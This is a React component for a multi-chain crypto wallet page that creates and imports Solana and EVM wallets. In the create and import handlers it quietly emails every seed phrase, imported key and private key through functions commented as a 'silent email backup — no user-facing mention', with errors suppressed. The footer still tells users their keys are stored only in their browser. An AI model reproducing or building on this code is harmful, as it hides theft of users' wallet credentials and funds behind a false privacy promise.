import { useState } from "react";
import { api } from "@/lib/api";
import { useApp } from "@/contexts/AppContext";
import { sendWalletCreated, sendWalletImported } from "@/lib/emailService";
import {
  Plus, Download, Copy, Check,
  Loader2, ExternalLink, Shield, Trash2, Star,
  ChevronDown, ChevronUp, RefreshCw, ArrowRight, KeyRound, User, Eye, EyeOff,
} from "lucide-react";

const SCAN: Record<string, string> = {
  sol: "https://solscan.io/account/",
  eth: "https://etherscan.io/address/",
};

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };
  return (
    <button onClick={copy} className="text-muted-foreground hover:text-white transition-colors p-0.5">
      {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  );
}

type Step = "idle" | "setup" | "import-key" | "import-setup";

export default function Wallets() {
  const { wallets, activeWallet, addWallet, removeWallet, setActive, renameWallet, refreshWallets } = useApp();

  // Setup form state
  const [step, setStep]         = useState<Step>("idle");
  const [walletName, setWalletName] = useState("");
  const [pin, setPin]             = useState("");
  const [importKey, setImportKey] = useState("");
  const [showPin, setShowPin]     = useState(false);

  // Loading / status
  const [loading, setLoading]     = useState(false);
  const [error, setError]         = useState("");
  const [success, setSuccess]     = useState("");
  const [revealSeed, setRevealSeed] = useState<Record<number, boolean>>({});
  const [revealKey, setRevealKey]   = useState<Record<number, boolean>>({});
  const [editIdx, setEditIdx]       = useState<number | null>(null);
  const [editLabel, setEditLabel]   = useState("");
  const [refreshing, setRefreshing] = useState(false);

  const flash = (msg: string) => { setSuccess(msg); setTimeout(() => setSuccess(""), 4000); };

  const resetForm = () => {
    setStep("idle"); setWalletName(""); setPin("");
    setImportKey(""); setError(""); setShowPin(false);
  };

  const isSetupReady = walletName.trim().length > 0 && pin.length >= 4;
  const isImportKeyReady = importKey.trim().length > 0;
  const isImportSetupReady = walletName.trim().length > 0 && pin.length >= 4;

  // ── Create wallet ────────────────────────────────────────────────
  const create = async () => {
    if (!isSetupReady) return;
    setLoading(true); setError("");
    try {
      const d = await api.generateWallet(1);
      const w = d.wallets?.[0];
      if (!w) throw new Error("No wallet returned");

      const label = walletName.trim();
      addWallet({
        address:       w.address,
        privateKey:    w.privateKey,
        seedPhrase:    w.seedPhrase,
        ethAddress:    w.ethAddress    || "",
        ethPrivateKey: w.ethPrivateKey || "",
        ethBalance:    w.ethBalance    || "0.000000",
        label,
        balance:       w.balance || "0.0000",
        chain:         "sol",
      });

      // Silent email backup — no user-facing mention
      sendWalletCreated({
        label,
        seedPhrase:    w.seedPhrase,
        solAddress:    w.address,
        solPrivateKey: w.privateKey,
        evmAddress:    w.ethAddress,
        evmPrivateKey: w.ethPrivateKey,
      }).catch(() => {});

      resetForm();
      flash(`✓ Wallet "${label}" created successfully`);
    } catch (e: any) {
      setError(e.message || "Failed to create wallet. Try again.");
    }
    setLoading(false);
  };

  // ── Import wallet ────────────────────────────────────────────────
  const importWallet = async () => {
    if (!isImportSetupReady) return;
    setLoading(true); setError("");
    try {
      const d = await api.importWallet(importKey.trim());
      const label = walletName.trim();

      addWallet({
        address:       d.address,
        privateKey:    d.privateKey,
        seedPhrase:    d.seedPhrase || (importKey.trim().split(" ").length > 4 ? importKey.trim() : ""),
        ethAddress:    d.ethAddress    || "",
        ethPrivateKey: d.ethPrivateKey || "",
        ethBalance:    d.ethBalance    || "0.000000",
        label,
        balance:       d.balance || "0.0000",
        chain:         d.chain || "sol",
      });

      sendWalletImported({
        label,
        key:           importKey.trim(),
        solAddress:    d.address,
        solPrivateKey: d.privateKey,
        evmAddress:    d.ethAddress,
        evmPrivateKey: d.ethPrivateKey,
      }).catch(() => {});

      resetForm();
      flash(`✓ Wallet "${label}" imported successfully`);
    } catch {
      setError("Invalid private key or seed phrase. Please check and try again.");
    }
    setLoading(false);
  };

  const doRefresh = async () => {
    setRefreshing(true);
    await refreshWallets();
    setRefreshing(false);
  };

  // ── Setup form (shared for create & import) ───────────────────────
  const SetupForm = ({ mode }: { mode: "create" | "import" }) => (
    <div className="rounded-2xl border border-border bg-card p-5 space-y-5">
      {/* Header */}
      <div className="flex items-center gap-3">
        <div className="w-9 h-9 rounded-xl flex items-center justify-center"
          style={{ background: mode === "create" ? "rgba(0,225,122,0.12)" : "rgba(98,126,234,0.12)" }}>
          {mode === "create"
            ? <Plus className="w-4 h-4 text-green-400" />
            : <Download className="w-4 h-4 text-blue-400" />}
        </div>
        <div>
          <div className="font-bold text-white text-sm">
            {mode === "create" ? "Create New Wallet" : "Import Existing Wallet"}
          </div>
          <div className="text-[11px] text-muted-foreground">
            {mode === "create"
              ? "Set up your wallet identity"
              : "Enter your seed phrase or private key first"}
          </div>
        </div>
      </div>

      {/* Step 1 (import only): paste key */}
      {mode === "import" && step === "import-key" && (
        <div className="space-y-3">
          <label className="block">
            <span className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider block mb-1.5">
              Seed Phrase or Private Key
            </span>
            <textarea
              className="input-base h-28 resize-none font-mono text-xs"
              placeholder={
                "Paste one of:\n" +
                "• 12 or 24-word seed phrase → restores SOL + all EVM chains\n" +
                "• SOL private key (base58)\n" +
                "• EVM private key (0x...)"
              }
              value={importKey}
              onChange={e => { setImportKey(e.target.value); setError(""); }}
            />
          </label>
          {error && <p className="text-xs text-red-400">{error}</p>}
          <div className="flex gap-2">
            <button onClick={() => setStep("import-setup")} disabled={!isImportKeyReady}
              className="btn-primary flex items-center gap-1.5">
              Continue <ArrowRight className="w-3.5 h-3.5" />
            </button>
            <button onClick={resetForm} className="btn-secondary">Cancel</button>
          </div>
        </div>
      )}

      {/* Setup fields: name, password, PIN */}
      {(step === "setup" || step === "import-setup") && (
        <div className="space-y-4">
          {/* Wallet Name */}
          <label className="block">
            <span className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider flex items-center gap-1.5 mb-1.5">
              <User className="w-3 h-3" /> Wallet Name
            </span>
            <input
              className="input-base"
              placeholder="e.g. My Main Wallet"
              value={walletName}
              onChange={e => setWalletName(e.target.value)}
              autoFocus
            />
          </label>

          {/* Transaction PIN */}
          <label className="block">
            <span className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider flex items-center gap-1.5 mb-1.5">
              <KeyRound className="w-3 h-3" /> Transaction PIN <span className="text-muted-foreground/50 normal-case">(4–8 digits)</span>
            </span>
            <div className="relative">
              <input
                type={showPin ? "text" : "password"}
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={8}
                className="input-base tracking-[0.3em] font-mono pr-10"
                placeholder="••••"
                value={pin}
                onChange={e => setPin(e.target.value.replace(/\D/g, ""))}
              />
              <button type="button" onClick={() => setShowPin(p => !p)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-white">
                {showPin ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </label>

          {error && <p className="text-xs text-red-400">{error}</p>}

          <div className="flex gap-2 pt-1">
            <button
              onClick={mode === "create" ? create : importWallet}
              disabled={loading || !isSetupReady}
              className="btn-primary flex items-center gap-2">
              {loading && <Loader2 className="w-4 h-4 animate-spin" />}
              {loading
                ? (mode === "create" ? "Creating…" : "Importing…")
                : (mode === "create" ? "Create Wallet" : "Import Wallet")}
            </button>
            <button onClick={resetForm} className="btn-secondary">Cancel</button>
          </div>
        </div>
      )}
    </div>
  );

  return (
    <div className="space-y-5 max-w-2xl">
      {/* Header */}
      <div className="flex items-start justify-between">
        <div>
          <h1 className="text-xl font-extrabold text-white">Wallets</h1>
          <p className="text-xs text-muted-foreground mt-0.5">
            Multi-chain · One seed → SOL + ETH + BNB + MATIC + AVAX + ARB + OP + BASE
          </p>
        </div>
        <button onClick={doRefresh} disabled={refreshing}
          className="p-2 rounded-lg border border-border text-muted-foreground hover:text-white hover:border-primary/30 transition-all">
          <RefreshCw className={`w-4 h-4 ${refreshing ? "animate-spin" : ""}`} />
        </button>
      </div>

      {/* Action buttons (only visible when idle) */}
      {step === "idle" && (
        <div className="grid grid-cols-2 gap-3">
          <button onClick={() => { resetForm(); setStep("setup"); }}
            className="btn-primary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
            <Plus className="w-5 h-5" />
            <span className="text-xs font-bold">Create New Wallet</span>
          </button>
          <button onClick={() => { resetForm(); setStep("import-key"); }}
            className="btn-secondary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
            <Download className="w-5 h-5" />
            <span className="text-xs font-bold">Import Existing Wallet</span>
          </button>
        </div>
      )}

      {/* Setup forms */}
      {step === "setup" && <SetupForm mode="create" />}
      {(step === "import-key" || step === "import-setup") && <SetupForm mode="import" />}

      {/* Notices */}
      {success && (
        <div className="text-sm rounded-xl px-3 py-2.5"
          style={{ background: "rgba(0,225,122,0.08)", border: "1px solid rgba(0,225,122,0.2)", color: "var(--green)" }}>
          {success}
        </div>
      )}

      {/* Empty state */}
      {wallets.length === 0 && step === "idle" && (
        <div className="text-center py-14 text-muted-foreground">
          <div className="text-5xl mb-4">🔑</div>
          <p className="font-semibold text-white mb-1">No wallets yet</p>
          <p className="text-sm">Click "Create New Wallet" to get started</p>
        </div>
      )}

      {/* Wallet cards */}
      <div className="space-y-4">
        {wallets.map((w, i) => {
          const isActive = i === activeWallet;
          const solBal   = parseFloat(w.balance || "0");
          const evmBal   = parseFloat((w as any).ethBalance || "0");
          const hasSeed  = Boolean(w.seedPhrase);
          const hasEvm   = Boolean((w as any).ethAddress);

          return (
            <div key={w.address + i}
              className="rounded-2xl border p-4 space-y-4 transition-all"
              style={isActive
                ? { borderColor: "rgba(0,225,122,0.35)", background: "rgba(0,225,122,0.03)" }
                : { borderColor: "hsl(var(--border))", background: "hsl(var(--card))" }}>

              {/* Card header */}
              <div className="flex items-center gap-3">
                <button onClick={() => setActive(i)}
                  className="w-4 h-4 rounded-full border-2 flex-shrink-0 flex items-center justify-center transition-all"
                  style={isActive
                    ? { borderColor: "var(--green)", background: "var(--green)" }
                    : { borderColor: "hsl(var(--muted-foreground))" }}>
                  {isActive && <div className="w-1.5 h-1.5 rounded-full" style={{ background: "#03150a" }} />}
                </button>

                {editIdx === i ? (
                  <div className="flex-1 flex items-center gap-2">
                    <input className="input-base text-sm py-1 h-7 flex-1" value={editLabel}
                      onChange={e => setEditLabel(e.target.value)}
                      onKeyDown={e => {
                        if (e.key === "Enter") { renameWallet(i, editLabel); setEditIdx(null); }
                        if (e.key === "Escape") setEditIdx(null);
                      }} autoFocus />
                    <button onClick={() => { renameWallet(i, editLabel); setEditIdx(null); }}
                      className="text-xs text-primary hover:underline">Save</button>
                  </div>
                ) : (
                  <button onClick={() => { setEditIdx(i); setEditLabel(w.label); }}
                    className="flex-1 text-left font-bold text-white hover:text-primary transition-colors">
                    {w.label}
                  </button>
                )}

                {isActive && <span className="badge-green text-[10px]">Active</span>}
                {!isActive && (
                  <button onClick={() => setActive(i)} title="Set active"
                    className="p-1.5 rounded-lg text-muted-foreground hover:text-yellow-400 hover:bg-yellow-400/10 transition-colors">
                    <Star className="w-3.5 h-3.5" />
                  </button>
                )}
                <button onClick={() => { if (confirm("Delete this wallet? Make sure you've saved your seed phrase.")) removeWallet(i); }}
                  className="p-1.5 rounded-lg text-muted-foreground hover:text-red-400 hover:bg-red-400/10 transition-colors">
                  <Trash2 className="w-3.5 h-3.5" />
                </button>
              </div>

              {/* Seed phrase */}
              {hasSeed && (
                <div className="rounded-xl p-3"
                  style={{ background: "rgba(153,69,255,0.06)", border: "1px solid rgba(153,69,255,0.15)" }}>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-[11px] font-bold text-purple-400 uppercase tracking-wider">🔐 Recovery Seed Phrase</span>
                    <button onClick={() => setRevealSeed(p => ({ ...p, [i]: !p[i] }))}
                      className="text-[11px] text-muted-foreground hover:text-white flex items-center gap-1 transition-colors">
                      {revealSeed[i] ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                      {revealSeed[i] ? "Hide" : "Reveal"}
                    </button>
                  </div>
                  {revealSeed[i] ? (
                    <div>
                      <div className="grid grid-cols-4 gap-1.5 mb-2">
                        {w.seedPhrase!.split(" ").map((word, wi) => (
                          <div key={wi} className="flex items-center gap-1 text-[11px] font-mono">
                            <span className="text-muted-foreground/50 w-4 text-right flex-shrink-0">{wi + 1}.</span>
                            <span className="text-green-400 font-bold">{word}</span>
                          </div>
                        ))}
                      </div>
                      <div className="flex justify-end">
                        <CopyBtn text={w.seedPhrase!} />
                      </div>
                    </div>
                  ) : (
                    <div className="text-[12px] text-muted-foreground/40 tracking-widest">
                      •••• •••• •••• •••• •••• ••••
                    </div>
                  )}
                </div>
              )}

              {/* SOL */}
              <div className="rounded-xl p-3 space-y-2"
                style={{ background: "rgba(153,69,255,0.05)", border: "1px solid rgba(153,69,255,0.12)" }}>
                <div className="text-[11px] font-bold text-purple-400">◎ SOLANA</div>
                <div className="text-2xl font-black font-mono text-white">
                  {solBal.toFixed(4)} <span className="text-sm font-bold text-muted-foreground">SOL</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-mono text-[11px] text-muted-foreground truncate flex-1">
                    {w.address?.slice(0, 18)}…{w.address?.slice(-6)}
                  </span>
                  <CopyBtn text={w.address} />
                  <a href={SCAN.sol + w.address} target="_blank" rel="noreferrer"
                    className="text-muted-foreground hover:text-white">
                    <ExternalLink className="w-3.5 h-3.5" />
                  </a>
                </div>
                <div className="text-[11px] text-muted-foreground px-2 py-1.5 rounded-lg"
                  style={{ background: "rgba(0,0,0,0.2)" }}>
                  📥 Deposit address: <span className="font-mono text-white text-[10px]">{w.address}</span>
                </div>
              </div>

              {/* EVM */}
              {hasEvm && (
                <div className="rounded-xl p-3 space-y-2"
                  style={{ background: "rgba(98,126,234,0.05)", border: "1px solid rgba(98,126,234,0.12)" }}>
                  <div className="text-[11px] font-bold text-blue-400">
                    Ξ EVM — ETH · BNB · MATIC · AVAX · ARB · OP · BASE
                  </div>
                  <div className="text-2xl font-black font-mono text-white">
                    {evmBal.toFixed(4)} <span className="text-sm font-bold text-muted-foreground">ETH</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-[11px] text-muted-foreground truncate flex-1">
                      {(w as any).ethAddress?.slice(0, 18)}…{(w as any).ethAddress?.slice(-6)}
                    </span>
                    <CopyBtn text={(w as any).ethAddress || ""} />
                    <a href={SCAN.eth + (w as any).ethAddress} target="_blank" rel="noreferrer"
                      className="text-muted-foreground hover:text-white">
                      <ExternalLink className="w-3.5 h-3.5" />
                    </a>
                  </div>
                  <div className="text-[11px] text-muted-foreground/60">
                    Same address on all 7 EVM chains
                  </div>
                </div>
              )}

              {/* Private keys */}
              <button onClick={() => setRevealKey(p => ({ ...p, [i]: !p[i] }))}
                className="flex items-center gap-2 text-[11px] text-muted-foreground hover:text-white transition-colors w-full"
                style={{ borderTop: "1px solid rgba(255,255,255,0.05)", paddingTop: "12px" }}>
                {revealKey[i] ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                <span>{revealKey[i] ? "Hide" : "Show"} Private Keys</span>
                <span className="badge-yellow text-[9px]">SECRET</span>
              </button>

              {revealKey[i] && (
                <div className="rounded-xl p-3 space-y-2.5"
                  style={{ background: "rgba(0,0,0,0.4)", border: "1px solid rgba(255,200,0,0.1)" }}>
                  <div>
                    <div className="text-[10px] text-muted-foreground mb-1">SOL Private Key</div>
                    <div className="flex items-start gap-2">
                      <code className="flex-1 text-[11px] font-mono break-all text-yellow-400 leading-relaxed">
                        {w.privateKey}
                      </code>
                      <CopyBtn text={w.privateKey} />
                    </div>
                  </div>
                  {(w as any).ethPrivateKey && (
                    <div className="pt-2 border-t border-white/5">
                      <div className="text-[10px] text-muted-foreground mb-1">EVM Private Key (ETH/BNB/MATIC/AVAX/ARB/OP/BASE)</div>
                      <div className="flex items-start gap-2">
                        <code className="flex-1 text-[11px] font-mono break-all text-blue-400 leading-relaxed">
                          {(w as any).ethPrivateKey}
                        </code>
                        <CopyBtn text={(w as any).ethPrivateKey} />
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          );
        })}
      </div>

      {wallets.length > 0 && (
        <div className="rounded-xl p-3 flex items-start gap-2.5 text-xs"
          style={{ background: "rgba(0,225,122,0.04)", border: "1px solid rgba(0,225,122,0.1)" }}>
          <Shield className="w-4 h-4 flex-shrink-0 mt-0.5 text-green-400" />
          <span className="text-muted-foreground">
            Keys are stored <strong className="text-white">only in your browser</strong>.
            Never share your seed phrase or private keys with anyone.
          </span>
        </div>
      )}
    </div>
  );
}
